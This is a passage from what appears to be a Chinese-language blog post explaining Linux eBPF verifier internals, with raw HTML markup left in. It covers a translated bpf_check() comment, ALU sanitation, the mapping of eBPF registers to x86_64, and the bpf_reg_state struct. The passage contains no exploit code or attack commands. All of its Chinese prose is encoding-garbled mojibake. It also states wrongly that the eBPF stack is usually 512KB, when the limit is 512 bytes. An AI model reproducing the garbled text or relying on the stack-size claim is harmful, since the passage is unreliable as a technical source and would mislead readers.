class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* bpf_check() æ˜¯ä¸€ä¸ªé™æ€ä»£ç åˆ†æå™¨ï¼Œå…¶é€æ¡éå† eBPF ç¨‹åºä¸­çš„æŒ‡ä»¤ï¼Œ</span><br><span class="hljs-comment"> * å¹¶æ›´æ–°å¯„å­˜å™¨/å †æ ˆçš„çŠ¶æ€ã€‚</span><br><span class="hljs-comment"> * æ¡ä»¶åˆ†æ”¯çš„æ‰€æœ‰è·¯å¾„éƒ½ä¼šè¢«åˆ†æï¼Œç›´åˆ° &#x27;bpf_exit&#x27; æŒ‡ä»¤ã€‚</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * é¦–å…ˆé€šè¿‡æ·±åº¦ä¼˜å…ˆæœç´¢æ£€æŸ¥ç¨‹åºæ˜¯å¦ä¸ºæœ‰å‘æ— ç¯å›¾ï¼ˆDirected Acyclic Graphï¼‰</span><br><span class="hljs-comment"> * å…¶æ‹’ç»ä»¥ä¸‹ç¨‹åº:</span><br><span class="hljs-comment"> * - æŒ‡ä»¤æ•°å¤§äº BPF_MAXINSNS </span><br><span class="hljs-comment"> * - å‡ºç°äº†å¾ªç¯ (é€šè¿‡åå‘è¾¹æ£€æµ‹)</span><br><span class="hljs-comment"> * - å­˜åœ¨ä¸å¯è¾¾æŒ‡ä»¤ (ä¸åº”å½“æ˜¯ä¸€ä¸ªæ£®æ—. ç¨‹åº = ä¸€ä¸ªå‡½æ•°)</span><br><span class="hljs-comment"> * - è¶Šç•Œæˆ–ç•¸å½¢è·³è½¬</span><br><span class="hljs-comment"> * æ¥ç€æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤å±•å¼€çš„æ‰€æœ‰å¯èƒ½è·¯å¾„ã€‚</span><br><span class="hljs-comment"> * ç”±äºå…¶åˆ†æç¨‹åºä¸­æ‰€æœ‰çš„è·¯å¾„ï¼Œåˆ†æçš„é•¿åº¦è¢«é™åˆ¶ä¸º 64k æŒ‡ä»¤ï¼Œ</span><br><span class="hljs-comment"> * å³ä½¿æ€»çš„æŒ‡ä»¤æ•°ä»…æœ‰ 4k å¯ä¹Ÿèƒ½è¾¾åˆ°ï¼Œä½†è¿™æœ‰å¤ªå¤šçš„ä¼šæ”¹å˜æ ˆ/å¯„å­˜å™¨çš„åˆ†æ”¯ã€‚</span><br><span class="hljs-comment"> * â€œè¢«åˆ†æçš„åˆ†æ”¯â€çš„æ•°é‡è¢«é™åˆ¶åœ¨ 1k</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨æ¯æ¡æŒ‡ä»¤çš„å…¥å£ï¼Œæ¯ä¸ªå¯„å­˜å™¨éƒ½æœ‰ä¸€ä¸ªç±»å‹ï¼Œè¯¥æŒ‡ä»¤æ ¹æ®æŒ‡ä»¤è¯­ä¹‰æ”¹å˜å¯„å­˜å™¨çš„ç±»å‹ã€‚</span><br><span class="hljs-comment"> * è‹¥æŒ‡ä»¤ä¸º BPF_MOV64_REG(BPF_REG_1, BPF_REG_5),  åˆ™ R5 çš„ç±»å‹ä¼šè¢«å¤åˆ¶ç»™ R1</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰€æœ‰çš„å¯„å­˜å™¨éƒ½æ˜¯ 64 ä½çš„</span><br><span class="hljs-comment"> * R0 - è¿”å›å¯„å­˜å™¨</span><br><span class="hljs-comment"> * R1-R5 ä¼ å‚å¯„å­˜å™¨</span><br><span class="hljs-comment"> * R6-R9 callee ä¿å­˜çš„å¯„å­˜å™¨</span><br><span class="hljs-comment"> * R10 - åªè¯»å¸§æŒ‡é’ˆ</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨ BPF ç¨‹åºèµ·å§‹ï¼Œ R1 å¯„å­˜å™¨åŒ…å«ä¸€ä¸ªæŒ‡å‘ bpf_context çš„æŒ‡é’ˆï¼Œ</span><br><span class="hljs-comment"> * å…¶ç±»å‹ä¸º PTR_TO_CTX.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Verifier è·Ÿè¸ªæŒ‡é’ˆä¸Šçš„è¿ç®—ï¼Œä»¥å…:</span><br><span class="hljs-comment"> *    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),</span><br><span class="hljs-comment"> *    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -20),</span><br><span class="hljs-comment"> * ç¬¬ä¸€æ¡æŒ‡ä»¤å°† R10 (FRAME_PTR) çš„ç±»å‹æ‹·è´ç»™ R1ï¼Œ</span><br><span class="hljs-comment"> * ç¬¬äºŒæ¡ç®—æœ¯æŒ‡ä»¤é€šè¿‡æ¨¡å¼åŒ¹é…ä»¥è¯†åˆ«å…¶æƒ³è¦æ„é€ ä¸€ä¸ªæŒ‡å‘æ ˆå†…å…ƒç´ çš„æŒ‡é’ˆã€‚</span><br><span class="hljs-comment"> * å› æ­¤åœ¨ç¬¬äºŒæ¡æŒ‡ä»¤åï¼Œå¯„å­˜å™¨ R1 çš„ç±»å‹ä¸º PTR_TO_STACK</span><br><span class="hljs-comment"> * (ä»¥åŠå¸¸é‡ -20 è¢«å­˜å‚¨ç”¨ä½œæœªæ¥çš„æ ˆè¾¹ç•Œæ£€æŸ¥).</span><br><span class="hljs-comment"> * è¿™æ„å‘³ç€è¯¥å¯„å­˜å™¨ä¸ºä¸€ä¸ªæŒ‡å‘[æ ˆ + å·²çŸ¥ç«‹å³æ•°å¸¸é‡]çš„æŒ‡é’ˆ</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯„å­˜å™¨éƒ½æœ‰ç€ SCALAR_VALUE ç±»å‹ï¼Œ</span><br><span class="hljs-comment"> * è¿™æ„å‘³ç€å¯„å­˜å™¨å­˜å‚¨ç€ä¸€äº›å€¼ï¼Œä½†å¹¶éä¸€ä¸ªå¯ç”¨çš„æŒ‡é’ˆ.</span><br><span class="hljs-comment"> * (ä¾‹å¦‚æŒ‡é’ˆåŠ ä¸ŠæŒ‡é’ˆä¼šå˜ä¸º SCALAR_VALUE ç±»å‹)</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å½“ verifier é‡åˆ° load æˆ– store æŒ‡ä»¤æ—¶åŸºå¯„å­˜å™¨ï¼ˆbase registerï¼‰çš„ç±»å‹å¯ä»¥ä¸ºï¼š</span><br><span class="hljs-comment"> * PTR_TO_MAP_VALUE, PTR_TO_CTX, PTR_TO_STACK, PTR_TO_SOCKET.</span><br><span class="hljs-comment"> * è¿™äº›æ˜¯ 4 ç§è¢« check_mem_access() å‡½æ•°æ‰€è¯†åˆ«çš„æŒ‡é’ˆç±»å‹.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * PTR_TO_MAP_VALUE æ„ä¸ºè¯¥å¯„å­˜å™¨æŒ‡å‘ &#x27;map element value&#x27;</span><br><span class="hljs-comment"> * å¯è®¿é—®çš„èŒƒå›´ä¸º [ptr, ptr + map&#x27;s value_size).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ç”¨ä»¥åœ¨å‡½æ•°è°ƒç”¨æ—¶ä¼ å€¼çš„å¯„å­˜å™¨è¢«æ ¹æ®å‡½æ•°å‚æ•°çº¦æŸè¿›è¡Œæ£€æŸ¥</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ARG_PTR_TO_MAP_KEY ä¾¿æ˜¯å…¶ä¸­ä¸€ä¸ªè¿™æ ·çš„å‚æ•°çº¦æŸ.</span><br><span class="hljs-comment"> * å…¶æ„ä¸ºä¼ é€’ç»™è¯¥å‡½æ•°çš„å¯„å­˜å™¨ç±»å‹å¿…é¡»ä¸º PTR_TO_STACK</span><br><span class="hljs-comment"> * ä¸”å…¶åœ¨å‡½æ•°å†…å°†è¢«ä½œä¸º &#x27;pointer to map element key&#x27; ä½¿ç”¨</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä¾‹å¦‚ï¼Œè¿™äº›æ˜¯ bpf_map_lookup_elem() çš„å‚æ•°çº¦å®š:</span><br><span class="hljs-comment"> *   .ret_type = RET_PTR_TO_MAP_VALUE_OR_NULL,</span><br><span class="hljs-comment"> *   .arg1_type = ARG_CONST_MAP_PTR,</span><br><span class="hljs-comment"> *   .arg2_type = ARG_PTR_TO_MAP_KEY,</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ret_type è¡¨ç¤ºè¯¥å‡½æ•°è¿”å› &#x27;pointer to map elem value or null&#x27;</span><br><span class="hljs-comment"> * å‡½æ•°å¸Œæœ›ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ªæŒ‡å‘ &#x27;struct bpf_map&#x27; çš„å¸¸é‡æŒ‡é’ˆï¼Œ</span><br><span class="hljs-comment"> * ç¬¬äºŒä¸ªå‚æ•°åˆ™åº”ä¸ºæŒ‡å‘æ ˆçš„æŒ‡é’ˆï¼Œå…¶ä¼šåœ¨ helper å‡½æ•°å†…ç”¨ä½œ</span><br><span class="hljs-comment"> * æŒ‡å‘[map element key]çš„æŒ‡é’ˆ</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å†…æ ¸ä¾§çš„ helper å‡½æ•°æœ‰å¦‚ä¸‹å½¢å¼:</span><br><span class="hljs-comment"> * u64 bpf_map_lookup_elem(u64 r1, u64 r2, u64 r3, u64 r4, u64 r5)</span><br><span class="hljs-comment"> * &#123;</span><br><span class="hljs-comment"> *    struct bpf_map *map = (struct bpf_map *) (unsigned long) r1;</span><br><span class="hljs-comment"> *    void *key = (void *) (unsigned long) r2;</span><br><span class="hljs-comment"> *    void *value;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *    è¿™é‡Œå†…æ ¸å¯ä»¥å®‰å…¨åœ°è®¿é—® &#x27;key&#x27; ä¸ &#x27;map&#x27; æŒ‡é’ˆ, çŸ¥æ™“</span><br><span class="hljs-comment"> *    [key, key + map-&gt;key_size) å­—èŠ‚ä¸ºå¯ç”¨çš„ä¸”è¢«</span><br><span class="hljs-comment"> *    åˆå§‹åŒ–åœ¨ eBPF ç¨‹åºçš„æ ˆä¸Š.</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ç›¸åº”çš„ eBPF ç¨‹åºæˆ–è®¸å½¢å¦‚:</span><br><span class="hljs-comment"> *    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // è¿™æ¡æŒ‡ä»¤å R2 çš„ç±»å‹ä¸º FRAME_PTR</span><br><span class="hljs-comment"> *    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // è¿™æ¡æŒ‡ä»¤å R2 çš„ç±»å‹ä¸º PTR_TO_STACK</span><br><span class="hljs-comment"> *    BPF_LD_MAP_FD(BPF_REG_1, map_fd),      // è¿™æ¡æŒ‡ä»¤å R1 çš„ç±»å‹ä¸º CONST_PTR_TO_MAP</span><br><span class="hljs-comment"> *    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span><br><span class="hljs-comment"> * è¿™é‡Œ verifier å…³æ³¨ map_lookup_elem() çš„åŸå‹ï¼Œä¼šçœ‹åˆ°:</span><br><span class="hljs-comment"> * .arg1_type == ARG_CONST_MAP_PTR ä»¥åŠ R1-&gt;type == CONST_PTR_TO_MAP, è¿™æ˜¯ ğŸ†— çš„,</span><br><span class="hljs-comment"> * ç°åœ¨ verifier çŸ¥é“è¯¥ map æœ‰ä¸€ä¸ª R1-&gt;map_ptr-&gt;key_size å­—èŠ‚çš„ key</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ç„¶åï¼Œ .arg2_type == ARG_PTR_TO_MAP_KEY and R2-&gt;type == PTR_TO_STACK, åˆ°ç°åœ¨è¿˜ğŸ†—,</span><br><span class="hljs-comment"> * ç°åœ¨ verifier æ£€æŸ¥ [R2, R2 + map&#x27;s key_size) åœ¨æ ˆçš„é™åˆ¶å†…ï¼Œ</span><br><span class="hljs-comment"> * ä¸”åœ¨è¯¥è°ƒç”¨ä¹‹å‰è¢«åˆå§‹åŒ–.</span><br><span class="hljs-comment"> * è‹¥ğŸ†—, verifier æ¥ä¸‹æ¥å…è®¸è¯¥ BPF_CALL æŒ‡ä»¤å¹¶å…³æ³¨</span><br><span class="hljs-comment"> * .ret_type ï¼ˆä¸º RET_PTR_TO_MAP_VALUE_OR_NULLï¼‰, æ•…è®©</span><br><span class="hljs-comment"> * R0-&gt;type = PTR_TO_MAP_VALUE_OR_NULL ï¼Œè¿™æ„å‘³ç€ bpf_map_lookup_elem() å‡½æ•°</span><br><span class="hljs-comment"> * è¿”å›æŒ‡å‘ map value çš„æŒ‡é’ˆæˆ– NULL.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å½“ç±»å‹ PTR_TO_MAP_VALUE_OR_NULL é€šè¿‡ &#x27;if (reg != 0) goto +off&#x27; æŒ‡ä»¤ï¼Œ</span><br><span class="hljs-comment"> * åœ¨ true åˆ†æ”¯ä¸­æŒæœ‰æŒ‡é’ˆçš„å¯„å­˜å™¨å°†çŠ¶æ€æ”¹å˜ä¸º PTR_TO_MAP_VALUEï¼Œ</span><br><span class="hljs-comment"> * åœ¨ false åˆ†æ”¯ä¸­åŒæ ·çš„å¯„å­˜å™¨å°†çŠ¶æ€æ”¹å˜ä¸º CONST_IMM ã€‚</span><br><span class="hljs-comment"> * å‚è§ check_cond_jmp_op().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨è°ƒç”¨å R0 è¢«è®¾ä¸ºå‡½æ•°è¿”å›å€¼ï¼Œå¯„å­˜å™¨ R1-R5 è¢«è®¾ä¸º NOT_INIT</span><br><span class="hljs-comment"> * ä»¥è¡¨ç¤ºå…¶ä¸å†å¯è¯».</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä»¥ä¸‹å¼•ç”¨ç±»å‹è¡¨ç¤ºä¸€ä¸ªå¯¹å†…æ ¸èµ„æºçš„æ½œåœ¨å¼•ç”¨ï¼Œ</span><br><span class="hljs-comment"> * åœ¨å…¶ç¬¬ä¸€æ¬¡è¢«åˆ†é…åï¼Œ BPF ç¨‹åºå¿…é¡»æ£€æŸ¥å¹¶é‡Šæ”¾è¯¥èµ„æº:</span><br><span class="hljs-comment"> * - PTR_TO_SOCKET_OR_NULL, PTR_TO_SOCKET</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å½“ verifier é‡åˆ°ä¸€ä¸ª helper è°ƒç”¨è¿”å›ä¸€ä¸ªå¼•ç”¨ç±»å‹, </span><br><span class="hljs-comment"> * å…¶ä¸ºè¯¥å¼•ç”¨åˆ†é…ä¸€ä¸ªæŒ‡é’ˆ id å¹¶å°†ä»–å‚¨å­˜åœ¨å½“å‰çš„å‡½æ•°çŠ¶æ€ä¸­.</span><br><span class="hljs-comment"> * ç±»ä¼¼äºå°† PTR_TO_MAP_VALUE_OR_NULL è½¬åŒ–ä¸º PTR_TO_MAP_VALUE çš„æ–¹å¼ï¼Œ</span><br><span class="hljs-comment"> * å½“ç±»å‹é€šè¿‡ä¸€ä¸ª NULL-check æ¡ä»¶ï¼Œ PTR_TO_SOCKET_OR_NULL å˜ä¸º PTR_TO_SOCKETã€‚</span><br><span class="hljs-comment"> * å¯¹äºçŠ¶æ€å˜ä¸º CONST_IMM çš„åˆ†æ”¯ï¼Œverifierä¼šé‡Šæ”¾å¼•ç”¨</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¯¹æ¯ä¸ªä¼šåˆ†é…ä¸€ä¸ªå¼•ç”¨çš„ helper å‡½æ•°ï¼Œä¾‹å¦‚ bpf_sk_lookup_tcp()ï¼Œ</span><br><span class="hljs-comment"> * éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„é‡Šæ”¾å‡½æ•°ï¼Œä¾‹å¦‚bpf_sk_release()ã€‚</span><br><span class="hljs-comment"> * å½“ä¸€ä¸ªå¼•ç”¨ç±»å‹ä¼ å…¥é‡Šæ”¾å‡½æ•°æ—¶ï¼Œverifier åŒæ ·é‡Šæ”¾å¼•ç”¨ã€‚</span><br><span class="hljs-comment"> * è‹¥åœ¨ç¨‹åºæœ«å°¾ä»ä¿ç•™æœ‰ä»»ä½•æœªæ£€æŸ¥æˆ–æœªé‡Šæ”¾çš„å¼•ç”¨ï¼Œverifier ä¼šæ‹’ç»ä»–</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h3 id="ALU-Sanitation"><a href="#ALU-Sanitation" class="headerlink" title="ALU Sanitation"></a>ALU Sanitation</h3><p><code>ALU Sanitation</code> æ˜¯ eBPF ä¸­ä¸€ä¸ª<strong>ä»£ç åŠ å›ºä¸è¿è¡Œæ—¶åŠ¨æ€æ£€æµ‹</strong>çš„æ¡†æ¶ï¼Œé€šè¿‡å¯¹ç¨‹åºæ­£åœ¨å¤„ç†çš„å®é™…å€¼è¿›è¡Œè¿è¡Œæ—¶æ£€æŸ¥ä»¥å¼¥è¡¥ verifier é™æ€åˆ†æçš„ä¸è¶³ï¼Œè¿™é¡¹æŠ€æœ¯é€šè¿‡è°ƒç”¨ <code>fixup_bpf_calls()</code> <strong>ä¸º eBPF ç¨‹åºä¸­çš„æ¯ä¸€æ¡æŒ‡ä»¤çš„å‰é¢éƒ½æ·»åŠ ä¸Šé¢å¤–çš„è¾…åŠ©æŒ‡ä»¤ã€æ›¿æ¢éƒ¨åˆ†æŒ‡ä»¤</strong>ç­‰æ–¹å¼æ¥å®ç°</p><h2 id="ä¸‰ã€eBPF-è™šæ‹Ÿæœº"><a href="#ä¸‰ã€eBPF-è™šæ‹Ÿæœº" class="headerlink" title="ä¸‰ã€eBPF è™šæ‹Ÿæœº"></a>ä¸‰ã€eBPF è™šæ‹Ÿæœº</h2><p>eBPF è™šæ‹Ÿæœºæœ¬è´¨ä¸Šæ˜¯ RISC æ¶æ„ï¼Œä¸€å…±æœ‰ 11 ä¸ª 64 ä½å¯„å­˜å™¨ï¼Œä¸€ä¸ªç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰ä¸ä¸€ä¸ªå›ºå®šå¤§å°çš„å †æ ˆï¼ˆé€šå¸¸ä¸º 512KBï¼‰ï¼Œåœ¨ x86 æ¶æ„ä¸‹çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="center">eBPF å¯„å­˜å™¨</th><th align="center">æ˜ å°„ x86_64 å¯„å­˜å™¨</th><th align="center">ç”¨é€”</th></tr></thead><tbody><tr><td align="center">R0</td><td align="center">rax</td><td align="center">å‡½æ•°è¿”å›å€¼</td></tr><tr><td align="center">R1</td><td align="center">rdi</td><td align="center">argv1</td></tr><tr><td align="center">R2</td><td align="center">rsi</td><td align="center">argv2</td></tr><tr><td align="center">R3</td><td align="center">rdx</td><td align="center">argv3</td></tr><tr><td align="center">R4</td><td align="center">rcx</td><td align="center">argv4</td></tr><tr><td align="center">R5</td><td align="center">r8</td><td align="center">argv5</td></tr><tr><td align="center">R6</td><td align="center">rbx</td><td align="center">callee ä¿å­˜</td></tr><tr><td align="center">R7</td><td align="center">r13</td><td align="center">callee ä¿å­˜</td></tr><tr><td align="center">R8</td><td align="center">r14</td><td align="center">callee ä¿å­˜</td></tr><tr><td align="center">R9</td><td align="center">r15</td><td align="center">callee ä¿å­˜</td></tr><tr><td align="center">R10ï¼ˆåªè¯»ï¼‰</td><td align="center">rbp</td><td align="center">å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨</td></tr></tbody></table><p>r1 ~ r5 è¿™äº”ä¸ªå¯„å­˜å™¨ç”¨ä½œ eBPF ä¸­çš„å‡½æ•°è°ƒç”¨ä¼ å‚ï¼Œä¸”åªèƒ½ä¿å­˜å¸¸æ•°æˆ–æ˜¯æŒ‡å‘å †æ ˆçš„æŒ‡é’ˆï¼Œå› æ­¤æ‰€æœ‰çš„å†…å­˜è®¿é—®éƒ½éœ€è¦å…ˆæŠŠæ•°æ®åŠ è½½åˆ° eBPF å †æ ˆä¸­æ‰èƒ½ä½¿ç”¨ï¼Œè¿™ç§é™åˆ¶ç®€åŒ–äº† eBPF çš„å†…å­˜æ¨¡å‹ï¼Œä¹Ÿæ›´æ–¹ä¾¿ verifier è¿›è¡Œæ£€æŸ¥</p><p><img src="https://s2.loli.net/2023/05/28/68e53xiKbH4TQz7.png" alt="eBPF.png"></p><h3 id="bpf-reg-state-eBPF-å¯„å­˜å™¨çŠ¶æ€"><a href="#bpf-reg-state-eBPF-å¯„å­˜å™¨çŠ¶æ€" class="headerlink" title="bpf_reg_state - eBPF å¯„å­˜å™¨çŠ¶æ€"></a>bpf_reg_state - eBPF å¯„å­˜å™¨çŠ¶æ€</h3><p>åœ¨ eBPF ä¸­ï¼Œä¸€ä¸ªå¯„å­˜å™¨çš„çŠ¶æ€ä¿¡æ¯ä½¿ç”¨ <code>bpf_reg_state</code> è¿›è¡Œè¡¨ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> &#123;</span><br><span class="hljs-comment">/* å„å­—æ®µçš„é¡ºåºæ˜¯é‡è¦çš„.  å‚è§ states_equal() */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_reg_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-comment">/* æŒ‡é’ˆåç§»çš„å›ºå®šéƒ¨åˆ†, ä»…æŒ‡é’ˆç±»å‹ */</span><br>s32 off;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* å½“ type == PTR_TO_PACKET æ—¶å¯ç”¨ */</span><br><span class="hljs-type">int</span> range;<br><br><span class="hljs-comment">/* å½“ type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span><br><span class="hljs-comment"> *   PTR_TO_MAP_VALUE_OR_NULL æ—¶å¯ç”¨</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map_ptr</span>;</span><br><span class="hljs-comment">/* ä¸ºäº†ä»å¤–éƒ¨æ˜ å°„ä¸­åŒºåˆ†æ˜ å°„æŸ¥æ‰¾</span><br><span class="hljs-comment"> * map_uid å¯¹äºæŒ‡å‘å†…éƒ¨æ˜ å°„çš„å¯„å­˜å™¨ä¸ºé 0 å€¼</span><br><span class="hljs-comment"> */</span><br>u32 map_uid;<br>&#125;;<br><br><span class="hljs-comment">/* for PTR_TO_BTF_ID */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br>u32 btf_id;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */</span><br>u32 mem_size;<br>u32 dynptr_id; <span class="hljs-comment">/* for dynptr slices */</span><br>&#125;;<br><br><span class="hljs-comment">/* For dynptr stack slots */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_dynptr_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-comment">/* ä¸€ä¸ª dynptr ä¸º 16 å­—èŠ‚ï¼Œ æ•…å…¶å ç”¨ 2 ä¸ª stack slots.</span><br><span class="hljs-comment"> * æˆ‘ä»¬éœ€è¦è¿½è¸ªå“ªä¸€ä¸ª slot ä¸ºç¬¬ä¸€ä¸ªé˜²æ­¢ç”¨æˆ·å¯èƒ½å°è¯•ä¼ å…¥ä¸€ä¸ªä»</span><br><span class="hljs-comment"> * dynptr çš„ç¬¬äºŒä¸ª slot å¼€å§‹çš„åœ°å€çš„æƒ…å†µçš„ slot.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> first_slot;<br>&#125; dynptr;<br><br><span class="hljs-comment">/* ä»¥ä¸Šä»»æ„ä¸€ä¸ªçš„æœ€å¤§å°ºå¯¸. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> raw1;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> raw2;<br>&#125; raw;<br><br>u32 subprogno; <span class="hljs-comment">/* for PTR_TO_FUNC */</span><br>&#125;;<br><span class="hljs-comment">/* å¯¹äºæ ‡é‡ç±»å‹ (SCALAR_VALUE), å…¶è¡¨ç¤ºæˆ‘ä»¬å¯¹å®é™…å€¼çš„äº†è§£.</span><br><span class="hljs-comment"> * å¯¹äºæŒ‡é’ˆç±»å‹, å…¶è¡¨ç¤ºä»è¢«æŒ‡å‘å¯¹è±¡çš„åç§»çš„å¯å˜éƒ¨åˆ†ï¼Œ</span><br><span class="hljs-comment"> * ä¸”åŒä¸æˆ‘ä»¬æœ‰ç›¸åŒ id çš„æ‰€æœ‰ bpf_reg_states å…±äº«.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var_off</span>;</span><br><span class="hljs-comment">/* è¢«ç”¨äºç¡®å®šä»»ä½•ä½¿ç”¨è¯¥å¯„å­˜å™¨çš„å†…å­˜è®¿é—®æ˜¯å¦å°†å¯¼è‡´ä¸€ä¸ªåçš„è®¿é—®.</span><br><span 